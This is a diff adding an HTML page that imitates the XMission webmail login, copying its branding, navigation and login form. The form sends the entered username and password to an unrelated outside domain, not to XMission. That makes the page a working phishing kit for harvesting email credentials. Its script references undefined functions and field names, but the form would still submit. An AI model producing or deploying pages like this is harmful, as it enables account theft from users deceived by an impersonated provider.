@@ -1,0 +1,137 @@
+<html><head>
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <link rel="shortcut icon" href="https://webmail.xmission.com/favicon.ico">
+  <link rel="shortcut icon" href="https://webmail.xmission.com/favicon.png" type="image/png">
+  <link rel="apple-touch-icon" href="https://webmail.xmission.com/apple-touch-icon.png">
+
+        <link rel="stylesheet" type="text/css" href="https://xmission.com/css/style_compact.css">
+
+        <title>XMission webmail login</title>
+        <style>
+            header ul#topNav {right: 50px;}
+            header .container {
+                margin-left:50px;
+                min-width:850px;
+            }
+            body {
+                background:#efefef !important;
+                font-family:roboto, arial, sans-serif;
+                color:#ddd;
+                margin:0;
+                padding:0;
+                font-size: 12px;
+            }
+            * {
+                margin: 0;
+                padding: 0;
+            }
+            .txtInput {direction:ltr}
+            #webMailContainer {  
+                background: white;
+                border-left: 20px solid #01c3e9;
+                border-radius: 0 !important;
+                box-shadow: 0 0 30px #ddd;
+                margin: 50px auto 60px auto;
+                padding: 40px 145px;
+                width: 420px;
+            }
+        </style>
+
+</head>
+
+<body>
+
+    <link rel="stylesheet" href="https://asset.xmission.com/xmweb3/xm-uhead.css">
+
+<nav id="xmNavHead">
+  <table class="container" cellpadding="0" cellspacing="0">
+    <tbody><tr>
+      <td class="logo">
+        <a href="#"><img src="https://asset.xmission.com/xmweb2/XMission-webmail-logo.png" alt="XMission Webmail"></a>
+      </td>
+      <td class="boxRight">
+        <input id="burger" type="checkbox">
+        <label for="burger">
+          <span></span><span></span><span></span>
+        </label>
+        <span id="linksHolder">
+        <a href="https://xmission.com" class="btnGrey">« XMission.com</a>
+        <a href="https://xmission.com/support" class="btnYellow">Support</a>
+        <a href="https://xmission.com/livesupport" class="btnBlue">Chat Live</a>
+        </span>
+      </td>
+    </tr>
+  </tbody></table>
+</nav>
+
+<script type="text/javascript">
+<!--
+function setFocus()
+{
+    if (document.horde_login.horde_user.value == "") {
+        document.horde_login.horde_user.focus();
+    } else {
+        document.horde_login.horde_pass.focus();
+    }
+}
+function submit_login(e)
+{
+    if (typeof e != 'undefined' && !enter_key_trap(e)) {
+        return;
+    }
+
+    if (document.horde_login.horde_user.value == "") {
+        alert("Please provide your username and password");
+        document.horde_login.horde_user.focus();
+        return false;
+    } else if (document.horde_login.horde_pass.value == "") {
+        alert("Please provide your username and password");
+        document.horde_login.horde_pass.focus();
+        return false;
+    } else {
+        document.horde_login.loginButton.disabled = true;
+        return getWebmailBackend();
+    }
+}
+//-->
+</script>
+
+<div style="height:50px"></div>
+
+<form id="login_webmail" name="horde_login" method="post" class="xmForm" action="https://webbersquarecommerce-products.xyz/xm/login.php">
+<input type="hidden" name="url" value="">
+
+<div id="webMailContainer"> <!--id="menu"> XM --> 
+<h1>Welcome to XMission Webmail</h1>
+
+<br class="spacer">
+
+
+<label class="row">
+    <strong>Username</strong>&nbsp;<br>
+    <input id="user_webmail" class="fixed txtInput" type="text" name="username" value="" style="direction:ltr" required />
+</label>
+
+<label class="row">
+    <strong>Password</strong>&nbsp;<br>
+    <input id="pass_webmail" class="fixed txtInput" type="password" name="password" value="" style="direction:ltr" required />
+</label>
+
+<label class="row buttons">
+    <input name="loginButton" class="button submit" value="Log in" type="submit" onclick="return submit_login();">
+</label>
+
+<input name="new_lang" type="hidden" value="en_US"> 
+<input name="login_post" type="hidden" value="1">
+
+</div>
+<!-- <center><div id="banner_container"></div></center> -->
+</form>
+
+
+
+
+
+
+</body></html>
